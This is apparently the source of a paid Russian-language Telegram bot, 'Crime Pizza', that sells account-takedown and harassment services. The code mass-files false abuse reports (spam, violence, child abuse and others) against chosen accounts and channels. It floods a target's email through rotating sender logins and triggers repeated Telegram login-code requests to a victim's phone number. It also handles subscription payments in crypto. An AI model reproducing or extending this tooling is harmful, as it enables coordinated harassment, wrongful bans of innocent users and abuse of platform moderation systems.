import aiohttp
import asyncio
import logging
import time
import os
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.utils import executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from telethon import TelegramClient, errors
from telethon.tl.functions.messages import ReportRequest
from telethon.tl.types import (
    InputReportReasonSpam,
    InputReportReasonViolence,
    InputReportReasonPornography,
    InputReportReasonChildAbuse,
    InputReportReasonCopyright,
    InputReportReasonGeoIrrelevant,
    InputReportReasonFake,
    InputReportReasonIllegalDrugs,
    InputReportReasonPersonalDetails
)
from telethon.tl.functions.channels import JoinChannelRequest
from datetime import datetime, timedelta
import re

from config import CHANNEL_ID, CHANNELS, bot_token, admin_chat_ids, CRYPTO_PAY_TOKEN, senders, receivers, smtp_servers, clients, VIP_PRICE, CURRENCY_PRICES, private_channel_ids
from proxies import proxies
from user_agents import user_agents
from emails import mail, phone_numbers 
import os, time

os.environ['TZ'] = 'Europe/Moscow'
time.tzset()   # применяется новая зона


# оставил обозначение потому что я заебался путатся и вы чтобы знали где какая тема
option_mapping = {
    '1': "1",  # InputReportReasonSpam
    '2': "2",  # InputReportReasonViolence
    '3': "3",  # InputReportReasonChildAbuse
    '4': "4",  # InputReportReasonPornography
    '5': "5",  # InputReportReasonCopyright
    '6': "6",  # InputReportReasonPersonalDetails
    '7': "7",  # InputReportReasonGeoIrrelevant
    '8': "8",  # InputReportReasonFake
    '9': "9",  # InputReportReasonIllegalDrugs
}

reason_mapping = {
    '1': "Spam",
    '2': "Violence",
    '3': "Child Abuse",
    '4': "Pornography",
    '5': "Copyright Infringement",
    '6': "Personal Data Leak",
    '7': "Geo-Irrelevant Content",
    '8': "Fake Information",
    '9': "Illegal Drugs"
}

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=bot_token)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

script_dir = os.path.dirname(os.path.abspath(__file__))
session_dir = os.path.join(script_dir, 'Session')
if not os.path.exists(session_dir):
    os.makedirs(session_dir)

class ComplaintStates(StatesGroup):
    subject = State()
    body = State()
    photos = State()
    count = State()
    text_for_site = State()
    count_for_site = State()

class RestoreAccountStates(StatesGroup):
    phone = State()
    send_count = State()

class SupportStates(StatesGroup):
    message = State()

class CreateAccountStates(StatesGroup):
    client = State()
    phone = State()
    code = State()
    password = State()

class ReportStates(StatesGroup):
    message_link = State()
    option = State()
    user_id = State()
    message_count = State()
    report_count = State()

def register_handlers_spam_code(dp: Dispatcher):
    dp.register_message_handler(process_spam_code, state=SpamCodeStates.phone_and_count)

banned_users_file = 'banned_users.txt'
class BanState(StatesGroup):
    waiting_for_ban_user_id = State()
    waiting_for_unban_user_id = State()
def load_banned_users():
    try:
        with open(banned_users_file, 'r') as file:
            return set(map(int, file.read().splitlines()))
    except FileNotFoundError:
        return set()
def save_banned_users(banned_users):
    with open(banned_users_file, 'w') as file:
        for user_id in banned_users:
            file.write(f'{user_id}\n')

banned_users = load_banned_users()

class SendMessage(StatesGroup):
    text = State()
    media_type = State()
    media = State()

def add_user_to_file(user_id: int):
    try:
        with open('users.txt', 'r') as file:
            users = file.readlines()
        users = [line.strip() for line in users if line.strip()]
        user_ids = [line.split()[0] for line in users if line.split()]

        if str(user_id) not in user_ids:
            with open('users.txt', 'a') as file:
                file.write(f"{user_id}\n")
    except Exception as e:
        print(f"Ошибка при добавлении пользователя в файл: {e}")

async def check_payment(user_id):
    if not os.path.exists('paid_users.txt'):
        print("Файл paid_users.txt не существует.")
        return False

    with open('paid_users.txt', 'r') as file:
        lines = file.readlines()

    for line in lines:
        line = line.strip()
        if not line:
            continue

        try:
            paid_user_id, expiry_time_str = line.split(',')
            if paid_user_id == str(user_id):
                expiry_time = datetime.strptime(expiry_time_str, '%Y-%m-%d %H:%M:%S')
                print(f"Найден пользователь {user_id}, время истечения: {expiry_time_str}, текущее время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                if expiry_time > datetime.now():
                    print("Подписка активна.")
                    return True
                else:
                    print("Подписка истекла.")
                    return False
        except ValueError as e:
            print(f"Ошибка при обработке строки '{line}': {e}")
            continue

    print(f"Пользователь {user_id} не найден в файле.")
    return False

from datetime import datetime, timedelta

async def save_paid_user(user_id, duration_days):
    expiry_time = datetime.now() + timedelta(days=duration_days)
    expiry_time_str = expiry_time.strftime('%Y-%m-%d %H:%M:%S')

    if not os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'w') as file:
            file.write(f"{user_id},{expiry_time_str}\n")
        return

    with open('paid_users.txt', 'r') as file:
        lines = file.readlines()

    updated = False
    updated_lines = []
    for line in lines:
        line = line.strip()
        if not line:
            continue

        try:
            paid_user_id, paid_expiry_time_str = line.split(',')
            paid_expiry_time = datetime.strptime(paid_expiry_time_str, '%Y-%m-%d %H:%M:%S')
            if paid_user_id == str(user_id):
                if paid_expiry_time > datetime.now():
                    expiry_time += paid_expiry_time - datetime.now()
                    expiry_time_str = expiry_time.strftime('%Y-%m-%d %H:%M:%S')
                updated_lines.append(f"{paid_user_id},{expiry_time_str}\n")
                updated = True
            else:
                updated_lines.append(line + '\n')
        except ValueError as e:
            print(f"Ошибка при обработке строки '{line}': {e}")
            continue

    if not updated:
        updated_lines.append(f"{user_id},{expiry_time_str}\n")

    with open('paid_users.txt', 'w') as file:
        file.writelines(updated_lines)

async def update_time():
    if not os.path.exists('paid_users.txt'):
        return
    with open('paid_users.txt', 'r') as file:
        lines = file.readlines()
    updated_lines = []
    for line in lines:
        user_id, expiry_time_str = line.strip().split(',')
        expiry_time = datetime.strptime(expiry_time_str, '%Y-%m-%d %H:%M:%S')
        if expiry_time > datetime.now():
            expiry_time -= timedelta(seconds=1)
            expiry_time_str = expiry_time.strftime('%Y-%m-%d %H:%M:%S')
        updated_lines.append(f"{user_id},{expiry_time_str}\n")
    with open('paid_users.txt', 'w') as file:
        file.writelines(updated_lines)

async def check_and_notify():
    if not os.path.exists('paid_users.txt'):
        return
    with open('paid_users.txt', 'r') as file:
        lines = file.readlines()
    for line in lines:
        user_id, expiry_time_str = line.strip().split(',')
        expiry_time = datetime.strptime(expiry_time_str, '%Y-%m-%d %H:%M:%S')
        if expiry_time <= datetime.now():
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Купить время", callback_data="go_to_payment"))
            await bot.send_message(user_id, "⏳ Ваше время истекло. Пожалуйста, купите дополнительное время.", reply_markup=markup)

def create_invoice(asset, amount, description):
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {
        "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
        "Content-Type": "application/json"
    }
    data = {
        "asset": asset,
        "amount": str(amount),
        "description": description,
        "payload": "custom_payload"
    }
    response = requests.post(url, headers=headers, json=data)
    if response.status_code == 200:
        return response.json()
    else:
        logging.error(f"Ошибка при создании счета: {response.status_code} - {response.text}")
        return None

def check_invoice_status(invoice_id):
    url = "https://pay.crypt.bot/api/getInvoices"
    headers = {
        "Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN,
        "Content-Type": "application/json"
    }
    params = {"invoice_ids": invoice_id}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        return response.json()
    else:
        logging.error(f"Ошибка при проверке статуса счета: {response.status_code} - {response.text}")
        return None

async def handle_welcome(user_id: int, chat_id: int, from_user: types.User, reply_photo_method):
    add_user_to_file(user_id)

    if not os.path.exists('paid_users.txt'):
        with open('paid_users.txt', 'w') as file:
            pass

    if not await check_payment(user_id) and str(user_id) not in admin_chat_ids:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("💳 Перейти к оплате", callback_data="go_to_payment"))
        markup.add(InlineKeyboardButton("🔑 Активировать Промокод", callback_data="activate_promo"))
        markup.add(InlineKeyboardButton("👑 Купить ВИП статус", callback_data="buy_vip"))

        await reply_photo_method(
            photo=open('unnamed.jpg', 'rb'),
            caption="✨ <b>Добро пожаловать!</b> ✨\n\n🚀 Чтобы получить доступ к Crime Pizza, необходимо оплатить подписку. Нажмите кнопку ниже, чтобы перейти к оплате.\n\n💎 <b>Премиум доступ открывает:</b>\n- 🔐 Полная защита от сноса через бота\n- 🎁 Эксклюзивные возможности\n Также у нас есть кейс бот @crime_case_bot",
            reply_markup=markup,
            parse_mode="HTML"
        )
        return

    first_name = from_user.first_name if from_user.first_name else ''
    last_name = from_user.last_name if from_user.last_name else ''
    username = f"@{from_user.username}" if from_user.username else f"id{from_user.id}"

    welcome_message = f"""
🌟 <b>Добро пожаловать, {first_name} {last_name} {username}!</b> 🌟
Мы рады видеть вас в Durov Pizza! Если у вас есть вопросы или нужна помощь, не стесняйтесь обращаться к поддержке. 😊
Также купите ВИП и получите премиум функции
📢 <b>Наши каналы:</b>
- <a href="https://t.me/+wVKJFn0WxN0yMDQy">Chrime Team</a>
- <a href="https://t.me/chrime_chat">Chrime Chat</a>
Наш кейс бот @crime_case_bot
🤖 <b>Создатель ботa:</b> 👑 <a href="https://t.me/reugid21">Lgener [rx]</a> 👑
"""

    await send_menu(chat_id, welcome_message)

class UserStates(StatesGroup):
    waiting_for_subscription = State()

async def is_user_subscribed(user_id, channel_id):
    try:
        member = await bot.get_chat_member(chat_id=channel_id, user_id=user_id)
        return member.status not in ["left", "kicked"]
    except Exception as e:
        print(f"Ошибка при проверке подписки на канал {channel_id}: {e}")
        return False

async def get_channel_name(channel_id):
    try:
        chat = await bot.get_chat(chat_id=channel_id)
        return chat.title
    except Exception as e:
        print(f"Ошибка при получении названия канала {channel_id}: {e}")
        return f"Канал {channel_id}"

async def check_all_subscriptions(user_id):
    not_subscribed_channels = {}
    for channel_id, channel_url in CHANNELS.items():
        if not await is_user_subscribed(user_id, channel_id):
            channel_name = await get_channel_name(channel_id)
            not_subscribed_channels[channel_name] = channel_url
    return not_subscribed_channels

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish()
    not_subscribed_channels = await check_all_subscriptions(message.from_user.id)

    if not not_subscribed_channels:
        await handle_welcome(
            user_id=message.from_user.id,
            chat_id=message.chat.id,
            from_user=message.from_user,
            reply_photo_method=message.reply_photo
        )
    else:
        await UserStates.waiting_for_subscription.set()
        keyboard = InlineKeyboardMarkup()
        for channel_name, channel_url in not_subscribed_channels.items():
            keyboard.add(InlineKeyboardButton(channel_name, url=channel_url))
        keyboard.add(InlineKeyboardButton("Проверить подписку", callback_data="check_subscription"))
        await message.reply("Для доступа к боту необходимо подписаться на следующие каналы:", reply_markup=keyboard)

@dp.callback_query_handler(lambda c: c.data == "check_subscription", state=UserStates.waiting_for_subscription)
async def check_subscription(callback_query: types.CallbackQuery, state: FSMContext):
    not_subscribed_channels = await check_all_subscriptions(callback_query.from_user.id)
    if not_subscribed_channels:
        keyboard = InlineKeyboardMarkup()
        for channel_name, channel_url in not_subscribed_channels.items():
            keyboard.add(InlineKeyboardButton(channel_name, url=channel_url))
        keyboard.add(InlineKeyboardButton("Проверить подписку", callback_data="check_subscription"))
        await callback_query.message.edit_text("Вы все еще не подписаны на следующие каналы:", reply_markup=keyboard)
    else:
        await callback_query.message.edit_text("Спасибо за подписку! Теперь вы можете пользоваться ботом.")
        await handle_welcome(
            user_id=callback_query.from_user.id,
            chat_id=callback_query.message.chat.id,
            from_user=callback_query.from_user,
            reply_photo_method=callback_query.message.reply_photo
        )

@dp.callback_query_handler(lambda c: c.data == 'send_welcome', state='*')
async def process_callback_send_welcome(callback_query: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await handle_welcome(
        user_id=callback_query.from_user.id,
        chat_id=callback_query.message.chat.id,
        from_user=callback_query.from_user,
        reply_photo_method=callback_query.message.reply_photo
    )
    await callback_query.answer()

async def send_menu(chat_id: int, welcome_message: str):
    markup = InlineKeyboardMarkup(row_width=2)
    btn_support = InlineKeyboardButton('📩 Написать в поддержку📩', callback_data='support')
    btn_demolition = InlineKeyboardButton('💣 Снос💣', callback_data='demolition')
    btn_restore_account = InlineKeyboardButton('🔄 Восстановить аккаунт🔄', callback_data='restore_account')
    btn_my_time = InlineKeyboardButton('👤Профиль👤', callback_data='my_time')
    btn_spam_menu = InlineKeyboardButton('🔥Спам🔥', callback_data='spam_menu')
    markup.add(btn_demolition)
    markup.add(btn_support, btn_spam_menu, btn_restore_account, btn_my_time)
    if str(chat_id) in admin_chat_ids:
        btn_admin_panel = InlineKeyboardButton('🛠 Админ панель', callback_data='admin_panel')
        markup.add(btn_admin_panel)

    await bot.send_photo(
        chat_id=chat_id,
        photo=open('welcome_photo.jpg', 'rb'),
        caption=welcome_message,
        reply_markup=markup,
        parse_mode="HTML"
    )

@dp.callback_query_handler(lambda c: c.data == 'extract_users', state='*')
async def extract_users_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    with open('users.txt', 'r', encoding='utf-8') as file:
        users_data = file.read()
    user_count = len(users_data.splitlines())
    document = types.InputFile('users.txt')
    await callback_query.message.answer_document(document)
    await callback_query.message.answer(f'📝В файле содержится {user_count} пользователей.')

@dp.callback_query_handler(lambda c: c.data == 'stats', state='*')
async def stats_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    with open('users.txt', 'r', encoding='utf-8') as file:
        lines = file.readlines()
        total_users = len(lines)
        active_users = sum(1 for line in lines if 'id' not in line)
    await callback_query.message.answer(f'📊Статистика:\n\n👤Всего пользователей: {total_users}\n✅Активных пользователей: {active_users}')

@dp.callback_query_handler(lambda c: c.data == 'send_message', state='*')
async def send_message_start(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    await callback_query.message.answer('Введите текст сообщения:')
    await SendMessage.text.set()

@dp.message_handler(state=SendMessage.text)
async def process_text(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['text'] = message.text
    markup = InlineKeyboardMarkup(row_width=2)
    btn_yes = InlineKeyboardButton('Да', callback_data='yes')
    btn_no = InlineKeyboardButton('Нет', callback_data='no')
    markup.add(btn_yes, btn_no)
    await message.answer('Хотите добавить фото или видео?', reply_markup=markup)
    await SendMessage.media_type.set()

@dp.callback_query_handler(lambda c: c.data in ['yes', 'no'], state=SendMessage.media_type)
async def process_media_type(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    async with state.proxy() as data:
        if callback_query.data == 'yes':
            await callback_query.message.answer('Отправьте фото или видео:')
            await SendMessage.media.set()
        else:
            await send_message_to_users(data['text'], None, None)
            await state.finish()
            await callback_query.message.answer('✅Сообщение отправлено всем пользователям.')

@dp.message_handler(content_types=['photo', 'video'], state=SendMessage.media)
async def process_media(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        if message.photo:
            data['media_type'] = 'photo'
            data['media'] = message.photo[-1].file_id
        elif message.video:
            data['media_type'] = 'video'
            data['media'] = message.video.file_id
        await send_message_to_users(data['text'], data['media_type'], data['media'])
        await state.finish()
        await message.answer('✅Сообщение отправлено всем пользователям.')

async def send_message_to_users(text, media_type, media_id):
    with open('users.txt', 'r', encoding='utf-8') as file:
        for line in file:
            user_id = line.split()[0]
            try:
                if media_type == 'photo':
                    await bot.send_photo(user_id, media_id, caption=text)
                elif media_type == 'video':
                    await bot.send_video(user_id, media_id, caption=text)
                else:
                    await bot.send_message(user_id, text)
            except Exception as e:
                logging.error(f'Error sending message to user {user_id}: {e}')

@dp.callback_query_handler(lambda c: c.data == 'demolition', state='*')
async def demolition_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    snos_message = (
        "───── ⋆⋅☆⋅⋆ ─────\n"
        f"🎄 Функционал для сноса 🎄\n"
        "📫Email-snos 2.0 📫 - снос через почты\n"
        "💻Web-snos💻 - снос через сайт\n"
        "❄️Freezer❄️ - заморозка аккаунтов\n"
        "🚨Botnet-snos🚨 - снос через репорты\n"
        "📢 Снос канала - снос канала через репорты\n"
        "───── ⋆⋅☆⋅⋆ ─────\n"
    )
    markup = InlineKeyboardMarkup(row_width=2)
    btn_email_complaint = InlineKeyboardButton('📫Email-snos 2.0 📫', callback_data='email_complaint')
    btn_website_complaint = InlineKeyboardButton('💻Web-snos💻', callback_data='website_complaint')
    btn_website_complaint2 = InlineKeyboardButton('❄️Freezer❄️', callback_data='website_complaint2')
    btn_report_message = InlineKeyboardButton('🚨Botnet-snos🚨', callback_data='report_message')
    btn_channel_demolition = InlineKeyboardButton('📢 Снос канала', callback_data='channel_demolition')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='to_start')
    markup.add(btn_email_complaint, btn_website_complaint, btn_website_complaint2, btn_report_message, btn_channel_demolition, btn_back)
    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=snos_message,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=snos_message,
            reply_markup=markup
        )

    await callback_query.message.edit_reply_markup(reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == 'spam_menu', state='*')
async def spam_menu_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    email_count = len(senders)
    client_count = len(clients)

    spam_message = (
        "───── ⋆⋅☆⋅⋆ ─────\n"
        f"📧 Управление спамом\n"
        f"📊 Количество почт: {email_count}\n"
        f"📊 Количество клиентов: {client_count}\n"
        "📌 Функции:\n"
        "🔥 Spam-code - Отправляет код входа.\n"
        "📧 Email-spam - Отправляет спам на почту.\n"
        "───── ⋆⋅☆⋅⋆ ─────\n"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_spam_code = InlineKeyboardButton('🔥Spam-code🔥', callback_data='spam_code')
    btn_email_spam = InlineKeyboardButton('📧 Email-spam📧', callback_data='email_spam')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='to_start')
    markup.add(btn_spam_code, btn_email_spam)
    markup.add(btn_back)

    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=spam_message,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=spam_message,
            reply_markup=markup
        )

    await callback_query.message.edit_reply_markup(reply_markup=markup)

class EmailSpamStates(StatesGroup):
    waiting_for_receiver = State()
    waiting_for_subject = State()
    waiting_for_body = State()
    waiting_for_count = State()

def send_spam_email(receiver, sender_email, sender_password, subject, body):
    domain = sender_email.split('@')[1]
    if domain not in smtp_servers:
        return False

    smtp_server, smtp_port = smtp_servers[domain]

    try:
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver, msg.as_string())
            time.sleep(3)
        return True
    except Exception as e:
        return False

@dp.callback_query_handler(lambda c: c.data == 'email_spam', state='*')
async def email_spam_callback(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    if user_id in banned_users:
        await callback_query.answer()
        await callback_query.message.answer('📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены 📢')
        return
    await callback_query.answer()
    await EmailSpamStates.waiting_for_receiver.set()
    await callback_query.message.answer("📧 Введите email получателя:")

@dp.message_handler(state=EmailSpamStates.waiting_for_receiver)
async def process_receiver_email(message: types.Message, state: FSMContext):
    await state.update_data(receiver=message.text)
    await EmailSpamStates.next()
    await message.answer("📝 Введите тему письма:")

@dp.message_handler(state=EmailSpamStates.waiting_for_subject)
async def process_subject(message: types.Message, state: FSMContext):
    await state.update_data(subject=message.text)
    await EmailSpamStates.next()
    await message.answer("📝 Введите текст письма:")

@dp.message_handler(state=EmailSpamStates.waiting_for_body)
async def process_body(message: types.Message, state: FSMContext):
    await state.update_data(body=message.text)
    await EmailSpamStates.next()
    await message.answer("🔢 Введите количество отправок:")

@dp.message_handler(state=EmailSpamStates.waiting_for_count)
async def process_count(message: types.Message, state: FSMContext):
    try:
        count = int(message.text)
        if count <= 0:
            await message.answer("❌ Количество отправок должно быть больше 0.")
            return

        data = await state.get_data()
        receiver = data.get('receiver')
        subject = data.get('subject')
        body = data.get('body')

        status_message = await message.answer("⏳ Подготовка к отправке...")

        successful = 0
        failed = 0

        for i in range(count):
            sender_email, sender_password = random.choice(list(senders.items()))
            status = send_spam_email(receiver, sender_email, sender_password, subject, body)

            if status:
                successful += 1
            else:
                failed += 1

            await status_message.edit_text(
                f"───── ⋆⋅☆⋅⋆ ─────\n"
                f"📤 Отправитель: {sender_email}\n"
                f"📥 Цель: {receiver}\n"
                f"📝 Тема: {subject}\n"
                f"📄 Текст: {body}\n"
                f"👀 Статус отправки: {'✅Удачно' if status else '❌Не удачно'}\n"
                f"📩 Отправлено: {i + 1}/{count}\n"
                f"───── ⋆⋅☆⋅⋆ ─────\n"
            )

        await status_message.edit_text(
            f"───── ⋆⋅☆⋅⋆ ─────\n"
            f"📬 Итоговый отчет\n"
            f"📥 Цель: {receiver}\n"
            f"✅ Удачно: {successful}\n"
            f"❌ Не удачно: {failed}\n"
            f"📝 Тема: {subject}\n"
            f"📄 Текст: {body}\n"
            f"───── ⋆⋅☆⋅⋆ ─────\n"
        )

        await state.finish()
    except ValueError:
        await message.answer("❌ Пожалуйста, введите корректное число.")



class SpamCodeStates(StatesGroup):
    waiting_for_numbers = State()

@dp.callback_query_handler(lambda c: c.data == 'spam_code')
async def process_callback_spam_code(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    if user_id in banned_users:
        await bot.answer_callback_query(callback_query.id)
        await bot.send_message(callback_query.from_user.id, '📢 Администратор посчитал ваш аккаунт подозрительным, и вы были забанены 📢')
        return
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(callback_query.from_user.id, '📞 Введите номера телефонов и количество отправлений для каждого, по одному номеру на строку в формате: +79991234567 10')
    await SpamCodeStates.waiting_for_numbers.set()

@dp.message_handler(state=SpamCodeStates.waiting_for_numbers)
async def process_spam_code_input(message: types.Message, state: FSMContext):
    try:
        lines = message.text.splitlines()
        phone_numbers = []
        for line in lines:
            line = line.strip()
            if line:
                phone_number, num_sendings = line.split()
                phone_numbers.append((phone_number, int(num_sendings)))
        if phone_numbers:
            await process_numbers(message, phone_numbers)
            await state.finish()
        else:
            await message.reply("Список номеров пуст.")
    except ValueError:
        await message.reply('❌ Неверный формат ввода. Используйте формат: +79991234567 10')


async def process_numbers(message, phone_numbers):
    message = await bot.send_message(message.chat.id, "⏳ Начинаем отправку кодов...")
    message_id = message.message_id
    overall_summary = "📊 Итоги отправки кодов\n"

    for phone_number, num_sendings in phone_numbers:
        summary = await send_code_requests(phone_number, num_sendings, message.chat.id, message_id, bot)
        overall_summary += summary

    await bot.edit_message_text(overall_summary, message.chat.id, message_id)

async def send_code_requests(phone_number, num_sendings, chat_id, message_id, bot):
    successful_sendings = 0
    failed_sendings = 0
    start_time = asyncio.get_event_loop().time()

    if not re.match(r'^\+?[1-9]\d{10,12}$', phone_number):
        return f"📱 Номер {phone_number}:\nОшибка: Неправильный формат\n"

    for i in range(num_sendings):
        client_data = random.choice(clients)
        client = None
        try:
            client = TelegramClient(client_data["name"], client_data["api_id"], client_data["api_hash"])
            await client.connect()
            await client.send_code_request(phone_number)
            successful_sendings += 1
            status = "✅ Удачно"
        except ValueError as e:
            failed_sendings += 1
            status = f"❌ Ошибка: Клиент '{client_data.get('name', 'неизвестный')}' зарегистрирован неправильно (неверные api_id/api_hash) или {e}"
        except Exception as e:
            failed_sendings += 1
            status = f"❌ Не удачно: {e}"
        finally:
            if client:
                await client.disconnect()
                client.session.delete()

        await bot.edit_message_text(f"📱 Номер: {phone_number}\n👤 Клиент: {client_data.get('name', 'неизвестный')}\n📤 Статус отправки: {status}\n📊 Отправлено: {successful_sendings + failed_sendings}/{num_sendings}\n", chat_id, message_id)
        await asyncio.sleep(1)

    end_time = asyncio.get_event_loop().time()
    elapsed_time = end_time - start_time
    total_time_str = "{:.2f}".format(elapsed_time)

    return (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"📱 Номер {phone_number}\n"
        f"✅ Удачных попыток: {successful_sendings}\n"
        f"❌ Неудачных попыток: {failed_sendings}\n"
        f"⏱️ Время выполнения: {total_time_str} сек.\n\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

import os

@dp.callback_query_handler(lambda c: c.data == 'admin_panel', state='*')
async def admin_panel_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    if os.path.exists("users.txt"):
        with open("users.txt", "r") as file:
            user_ids = [line.strip() for line in file.readlines() if line.strip()]
            user_count = len(user_ids)
    else:
        user_count = 0

    admin_message = (
        "───── ⋆⋅☆⋅⋆ ─────\n"
        f"👋 Приветствую тебя админ!\n\n"
        f"📊 Статистика: Пользователей использует бот: {user_count}\n\n"
        "📌 Функции админа:\n"
        "🚫 Бан - Заблокировать пользователя.\n"
        "👥 Статистика - Просмотр статистики бота.\n"
        "👑 Vip - Зашита от сноса.\n"
        "🔑 Создать .session - Создать новый сессионный файл.\n"
        "👀 Кто админ - Просмотр списка админов.\n"
        "⏳ Подписка - Управление подписками пользователей.\n"
        "🎫 Промокоды - Управление промокодами.\n"
        "🔙 Назад - Вернуться в главное меню.\n"
        "───── ⋆⋅☆⋅⋆ ─────"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_banis = InlineKeyboardButton('🚫Бан🚫', callback_data='banis_user')
    btn_statsit = InlineKeyboardButton('👥Статистика👥', callback_data='statsit')
    btn_privat = InlineKeyboardButton('👑vip👑', callback_data='privat')
    btn_create_account = InlineKeyboardButton('🔑 Создать .session', callback_data='create_account')
    btn_view_admins = InlineKeyboardButton('👀 Кто админ', callback_data='view_admins')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='to_start')
    btn_user = InlineKeyboardButton('⏳Подписка⏳', callback_data='user')
    btn_promocodes = InlineKeyboardButton('🎫 Промокоды', callback_data='promocodes_menu')
    markup.add(btn_banis, btn_statsit, btn_privat, btn_create_account, btn_view_admins, btn_user, btn_promocodes)
    markup.add(btn_back)

    await bot.edit_message_caption(
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        caption=admin_message,
        reply_markup=markup
    )

@dp.callback_query_handler(lambda c: c.data == 'promocodes_menu', state='*')
async def promocodes_menu_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()

    if os.path.exists("promocodes.txt"):
        with open("promocodes.txt", "r", encoding="utf-8") as file:
            promotions_data = file.read().strip().split("-----------------------------")
            promo_count = len([p for p in promotions_data if p.strip()])
            promo_list = []
            for promo in promotions_data:
                if not promo.strip():
                    continue
                name_match = re.search(r"🎫 Промокод: (.+)", promo)
                activations_match = re.search(r"🔢 Активаций: (.+)", promo)
                if name_match and activations_match:
                    name = name_match.group(1).strip()
                    activations = activations_match.group(1).strip()

                    if activations.isdigit():
                        promo_list.append(f"- {name}: {activations} активаций")
                    else:
                        promo_list.append(f"- {name}: {activations}")
    else:
        promo_count = 0
        promo_list = ["Промокоды отсутствуют."]

    promo_message = (
        f"───── ⋆⋅☆⋅⋆ ─────\n"
        f"🎫 Промокоды\n\n"
        f"📊 Количество промокодов: {promo_count}\n\n"
        f"📝 Список промокодов:\n"
        f"{chr(10).join(promo_list)}\n"
        f"───── ⋆⋅☆⋅⋆ ─────"
    )

    markup = InlineKeyboardMarkup(row_width=2)
    btn_create_promo = InlineKeyboardButton('🎫 Создать промокод', callback_data='create_promo')
    btn_delete_promo = InlineKeyboardButton('❌ Удалить промокод', callback_data='delete_promo')
    btn_edit_promo = InlineKeyboardButton('✏️ Редактировать промокод', callback_data='edit_promo')
    btn_back = InlineKeyboardButton('🔙 Назад', callback_data='admin_panel')
    markup.add(btn_create_promo, btn_delete_promo, btn_edit_promo)
    markup.add(btn_back)

    if callback_query.message.photo:
        await bot.edit_message_caption(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            caption=promo_message,
            reply_markup=markup
        )
    else:
        await bot.edit_message_text(
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            text=promo_message,
            reply_markup=markup
        )


PRIVATE_USERS_FILE = 'private_users.txt'

def read_private_users():
    try:
        with open("private_users.txt", "r", encoding="utf-8") as file:
            lines = file.readlines()
    except FileNotFoundError:
        return {"ids": [], "usernames": []}
    if not lines:
        return {"ids": [], "usernames": []}
    ids = list(map(int, lines[0].strip().split(','))) if lines[0].strip() else []
    usernames = lines[1].strip().split(',') if len(lines) > 1 and lines[1].strip() else []

    return {"ids": ids, "usernames": usernames}

def write_private_users(private_users):
    with open(PRIVATE_USERS_FILE, 'w') as file:
        file.write(','.join(map(str, private_users["ids"])) + '\n')
        file.write(','.join(private_users["usernames"]))

@dp.callback_query_handler(lambda c: c.data == 'privat', state='*')
async def privat_callback(callback_query: types.CallbackQuery, state: FSMContext):
    await callback_query.answer()
    private_users = read_private_users()

    if not private_users["ids"]:
        users_list = "👥 Список пользователей под прыватом пуст.\n"
    else:
        users_list = "👥 Список пользователей под прыватом:\n"
        users_list += "🆔 IDs: " + ", ".join(map(str, private_users["ids"])) + "\n"
